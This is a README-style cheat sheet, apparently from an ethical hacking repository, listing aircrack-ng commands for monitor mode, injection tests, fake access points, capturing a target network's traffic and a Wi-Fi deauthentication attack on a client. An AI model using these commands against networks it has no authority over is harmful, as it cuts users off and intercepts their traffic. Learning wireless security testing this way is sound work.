# These commands are works only on linux based OS system
## An external Network Adapter is required, Your Network Adapter must support `monitor mode`, `packet injection mode`

### Here my network interface name is `wlan1`, use these commands `iwconfig` or `ifconfig` to check your network interface name, your network interface name may be diffrent use accordingly.
## Table of Content
- [Network Manager Commands](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#network-manager-commands)
- [Network Adapter testing commands](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#network-adapter-testing-commands)
- [Packet Sniffing](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#packet-sniffing)
- [DE-Authentication Attack](https://github.com/ohm-vishwa/Ethical_Hacking?tab=readme-ov-file#de-authentication-attack)

First you need to switch root user `sudo su`

---
# Network Manager Commands
## Check Status of Network Manager
```
systemctl status NetworkManager
```
## kill network manager
```
airmon-ng check kill
```
## Enable Network Manager
```
service NetworkManager start
```
## Restart Network Manager
```
systemctl restart NetworkManager
```
---
# Network Adapter Testing Commands
## Enable Monitor Mode
```
airmon-ng start wlan1
```
## Disable Monitor Mode
```
airmon-ng stop wlan1
```
## Packet Injection test
```
aireplay-ng --test wlan1
```
## Creating Access Point Test
you can put any fake MAC Address like this `00:01:02:03:04:05`
```
airbase-ng -a 00:01:02:03:04:05 --essid "test_01" -c 11 wlan1
```
---
# Packet Sniffing
### sniff network around us `2.4 GHz`
```
airodump-ng wlan1
```
### sniff network Both `2.4 GHz and 5 GHz`
```
airodump-ng --band a wlan1
```
### capture data both `2.4 GHz and 5 GHz`
```
airodump-ng --band abg wlan1
```
### capture data into a file `fileName`
```
airodump-ng --bssid @1 --channel @2 --write fileName wlan1
```
@1 → `BSSID` of target

@2 → Channel no. of target

### open wireshark application to read captured data, captured in `fileName.cap`, 
```
wireshark
```
---
# DE-Authentication Attack
```
aireplay-ng --deauth @1 -a @2 -c @3 wlan1
```
@1 → no. of packets you want to send 

@2 → BSSID of router

@3 → MAC Address of the Client


